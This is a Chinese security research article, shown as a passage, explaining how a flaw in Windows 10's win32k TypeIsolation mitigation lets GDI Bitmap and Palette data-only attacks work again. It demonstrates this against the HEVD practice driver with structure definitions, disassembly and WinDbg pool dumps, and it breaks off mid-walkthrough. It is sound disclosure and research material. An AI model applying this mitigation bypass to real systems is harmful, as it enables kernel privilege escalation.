原文来自安全客，作者：k0shl from 360vulcan team  
原文链接：
作者twitter：[@KeyZ3r0](https://twitter.com/KeyZ3r0 "@KeyZ3r0")  
作者微博：[@我叫0day谁找我_](https://weibo.com/p/1005055342666404 "@我叫0day谁找我_")
#### 一、背景
近年来，在内核漏洞利用中利用GDI object来完成任意地址R/W的方法越来越成熟，在池溢出（pool overflow），任意地址写（arbitrary
write），越界写（oob write），释放后重用（uaf），二次释放（double free）等很多漏洞类型的场景中，都可以利用GDI
object来完成任意地址读写，我们称为GDI data-only attack。
微软在Windows 10 build 1709版本之后引入了win32k类型隔离用来缓解GDI
object这种利用方式，我在对win32kbase.sys关于typeisolation实现的逆向工程中发现了微软在设计类型隔离这种缓解措施时的一处失误，导致在某些常见漏洞场景中仍然可以利用GDI
object完成data-only exploitation，在本文中，我将与大家分享这个新的攻击方案思路。
**调试环境：**
**OS:**
Windows 10 rs3 16299.371
**FILE:**
Win32kbase.sys 10.0.16299.371
#### 二、GDI data-only attack
GDI data-only attack是当前内核漏洞利用中比较常见的利用手段之一，利用常见的漏洞场景修改GDI
object的某些特定成员变量，就可以使用win32k中管理GDI的API完成任意地址读写。目前，在GDI data-only
attack中常用的两个GDI object是Bitmap以及Palette，关于Bitmap一个重要的结构是
    typedef struct _SURFOBJ {
    DHSURF dhsurf;
    HSURF  hsurf;
    DHPDEV dhpdev;
    HDEV   hdev;
    SIZEL  sizlBitmap;
    ULONG  cjBits;
    PVOID  pvBits;
    PVOID  pvScan0;
    LONG   lDelta;
    ULONG  iUniq;
    ULONG  iBitmapFormat;
    USHORT iType;
    USHORT fjBitmap;
    } SURFOBJ, *PSURFOBJ;
Palette一个重要的结构是：
    typedef struct _PALETTE64
    {
    BASEOBJECT64      BaseObject;
    FLONG           flPal;
    ULONG32           cEntries;
    ULONG32           ulTime;
    HDC             hdcHead;
    ULONG64        hSelected;
    ULONG64           cRefhpal;
    ULONG64          cRefRegular;
    ULONG64      ptransFore;
    ULONG64      ptransCurrent;
    ULONG64      ptransOld;
    ULONG32           unk_038;
    ULONG64         pfnGetNearest;
    ULONG64   pfnGetMatch;
    ULONG64           ulRGBTime;
    ULONG64       pRGBXlate;
    PALETTEENTRY    *pFirstColor;
    struct _PALETTE *ppalThis;
    PALETTEENTRY    apalColors[3];
    }
在Bitmap和Palette的内核结构中，和GDI data-only
attack相关的两个重要成员变量是Bitmap->pvScan0和Palette->pFirstColor。这两个成员变量指向Bitmap和Palette的data域，可以通过GDI
API向data域读取或写入数据，只要我们通过触发漏洞修改这两个成员变量指向任意内存地址，就可以通过GetBitmapBits/SetBitmapBits或GetPaletteEntries/SetPaletteEntries完成对指向任意内存地址写入和读取，也就是任意地址读写。
关于利用Bitmap和Palette来完成GDI data-only
attack现在网上已经有很多相关的技术文章，同时也不是本文的讨论重点，这里就不做更深入的分享，相关的资料可以参考第五部分。
#### 三、Win32k TypeIsolation
GDI data-only attack这种利用方式大大降低了内核利用的难度，且在大多数常见漏洞类型的场景中都可以应用，微软在Windows10 rs3
build 1709之后增加了一个新的缓解机制—-win32k typeisolation，通过一个双向链表将GDI object统一管理起来，同时将GDI
object的头部与data域分离，这样不仅仅缓解了利用pool fengshui制造可预测池再使用GDI
object进行占位并修改关键成员变量这种利用技术，同时也缓解了通过修改头部其他成员变量来增大data域可控范围这种利用技术，因为头部与data域部分不再相邻。
关于win32k typeisolation的机制可参考下图：
在这里我对win32k typeisolation的机制关键部分进行简要说明，关于win32k typeisolation的详细运行机制，包括GDI
object的申请，分配，释放等可参考第五部分。
在win32k typeisolation中，GDI
object通过CSectionEntry这个双向链表进行统一管理，其中view域指向一个0x28000大小的内存空间，而GDI
object的头部在这里统一被管理，view域以view数组的方式管理，数组大小是0x1000。而在对GDI
object的分配时RTL_BITMAP会作为是否向指定view域位置分配GDI object的重要依据。
在CSectionEntry中，bitmap_allocator指向CSectionBitmapAllocator，在CSectionBitmapAllocator中存放的xored_view，xor_key，xored_rtl_bitmap，其中xored_view
^ xor_key指向view域，xored_rtl_btimap ^ xor_key指向RTL_BITMAP。
在RTL_BITMAP中bitmap_buffer_ptr指向的BitmapBuffer用于记录view域的状态，空闲为0，占位为1。当申请GDI
object的时候，会通过win32kbase!gpTypeIsolation开始遍历CSectionEntry列表，通过对CSectionBitmapAllocator查看是否当前view域包含空闲位置，如果存在空闲位则会将新的GDI
object header放置在view域中。
我对CTypeIsolation类和CSectionEntry类关于对GDI
object申请和释放实现的逆向中发现，TypeIsolation在对CSectionEntry双向链表遍历，利用CSectionBitmapAllocator判断view域状态，并对view域中存放的GDI
object
SURFACE进行管理的过程中，并没有检查CSectionEntry->view和CSectionEntry->bitmap_allocator指针指向的有效性，也就是说如果我们能够构造一个fake
view和fake
bitmap_allocator并能够利用漏洞修改CSectionEntry->view和CSectionEntry->bitmap_allocator使其指向fake
struct，则我们可以重新利用GDI object完成data-only attack。
#### 四、Save and reborn gdi data-only attack！
在本节中我来和大家分享一下这种攻击方案的利用思路，HEVD是Hacksysteam开发的一个存在典型内核漏洞的练习驱动，在HEVD中存在一个任意地址（Arbitrary
Write）漏洞，我们就以这个漏洞为例来和大家分享整个利用过程。
**Attack scenario：**
首先来看一下CSectionEntry的申请，CSectionEntry会申请0x40大小的session paged
pool，CSectionEntry申请池空间的实现在NSInstrumentation::CSectionEntry::Create()中。
    .text:00000001C002AC8A                 mov     edx, 20h        ; NumberOfBytes
    .text:00000001C002AC8F                 mov     r8d, 6F736955h  ; Tag
    .text:00000001C002AC95                 lea     ecx, [rdx+1]    ; PoolType
    .text:00000001C002AC98                 call    cs:__imp_ExAllocatePoolWithTag //Allocate 0x40 session paged pool
也就是说，我们仍然可以通过pool fengshui来制造一个可预测的session paged pool
hole用来给CSectionEntry占位，因此在HEVD这个Arbitrary
write的漏洞利用场景中，我们使用tagWND的方法制造一个稳定的pool
hole，并且利用[HMValidateHandle](https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
"HMValidateHandle")泄露tagWND内核对象地址。因为当前漏洞实例是一个任意地址写漏洞，因此如果我们能泄露内核对象地址便于我们对这个攻击方案思路的理解，当然在很多攻击场景中只需要利用pool
fengshui制造一个可预测池即可。
    kd> g//利用tagWND制造一个稳定的pool hole
    Break instruction exception - code 80000003 (first chance)
    0033:00007ff6`89a61829 cc              int     3
    kd> p
    0033:00007ff6`89a6182a 488b842410010000 mov     rax,qword ptr [rsp+110h]
    kd> p
    0033:00007ff6`89a61832 4839842400010000 cmp     qword ptr [rsp+100h],rax
    kd> r rax
    rax=ffff862e827ca220
    kd> !pool ffff862e827ca220
    Pool page ffff862e827ca220 region is Unknown
    ffff862e827ca000 size:  150 previous size:    0  (Allocated)  Gh04
    ffff862e827ca150 size:   10 previous size:  150  (Free)       Free
    ffff862e827ca160 size:   b0 previous size:   10  (Free )  Uscu
    *ffff862e827ca210 size:   40 previous size:   b0  (Allocated) *Ustx Process: ffffd40acb28c580
    Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
    ffff862e827ca250 size:   e0 previous size:   40  (Allocated)  Gla8
    ffff862e827ca330 size:   e0 previous size:   e0  (Allocated)  Gla8```
在0xffff862e827ca220制造了一个稳定的session paged pool
hole，0xffff862e827ca220会在之后释放，处于free状态。
    kd> p
    0033:00007ff7`abc21787 488b842498000000 mov     rax,qword ptr [rsp+98h]
    kd> p
    0033:00007ff7`abc2178f 48398424a0000000 cmp     qword ptr [rsp+0A0h],rax
    kd> !pool ffff862e827ca220
    Pool page ffff862e827ca220 region is Unknown
    ffff862e827ca000 size:  150 previous size:    0  (Allocated)  Gh04
    ffff862e827ca150 size:   10 previous size:  150  (Free)       Free
    ffff862e827ca160 size:   b0 previous size:   10  (Free )  Uscu
    *ffff862e827ca210 size:   40 previous size:   b0  (Free ) *Ustx
    Pooltag Ustx : USERTAG_TEXT, Binary : win32k!NtUserDrawCaptionTemp
    ffff862e827ca250 size:   e0 previous size:   40  (Allocated)  Gla8
    ffff862e827ca330 size:   e0 previous size:   e0  (Allocated)  Gla8
下面我们需要令CSecitionEntry在0xffff862e827ca220位置占位，这就需要利用TypeIsolation的一个特性，正如第二节我们提到的，在GDI
object对象申请时，会遍历CSectionEntry，并通过CSectionBitmapAllocator判断view域中是否有空闲位，如果CSectionEntry的view域已满，则会到下一个CSectionEntry中继续查询，但如果当前的CTypeIsolation双向链表中，所有的CSectionEntry的view域全都被占满，则会调用NSInstrumentation::CSectionEntry::Create()创建一个新的CSectionEntry。
因此，我们在制造完pool hole之后申请大量的GDI
object，用来占满所有CSectionEntry的view域，以确保创建新的CSectionEntry，并且占用0x40大小的pool hole。
    kd> g//创建大量的GDI object， 0xffff862e827ca220位置被CSectionEntry占位
    kd> !pool ffff862e827ca220
    Pool page ffff862e827ca220 region is Unknown
    ffff862e827ca000 size:  150 previous size:    0  (Allocated)  Gh04
    ffff862e827ca150 size:   10 previous size:  150  (Free)       Free
    ffff862e827ca160 size:   b0 previous size:   10  (Free )  Uscu
    *ffff862e827ca210 size:   40 previous size:   b0  (Allocated) *Uiso
    Pooltag Uiso : USERTAG_ISOHEAP, Binary : win32k!TypeIsolation::Create
    ffff862e827ca250 size:   e0 previous size:   40  (Allocated)  Gla8 ffff86b442563150 size:
接下来我们需要构造fake CSectionEntry->view和fake
CSectionEntry->bitmap_allocator，并且利用Arbitrary Write修改session paged pool
hole中的CSectionEntry中的指针，使其指向我们构造的fake struct。
在我们申请大量GDI object的时候建立的新的CSectionEntry的view域中可能已经被SURFACE占满或占据了一部分，如果我们构造fake
struct的时候将view域构造成空，那么就可以欺骗TypeIsolation，在GDI object申请的时候会将SURFACE放在已知位置。
我们通过VirtualAllocEx在userspace申请内存存放fake struct，并且我们将userspace
memory属性置成READWRITE。
    kd> dq 1e0000//fake pushlock
    00000000`001e0000  00000000`00000000 00000000`0000006c
    kd> dq 1f0000//fake view
    00000000`001f0000  00000000`00000000 00000000`00000000
    00000000`001f0010  00000000`00000000 00000000`00000000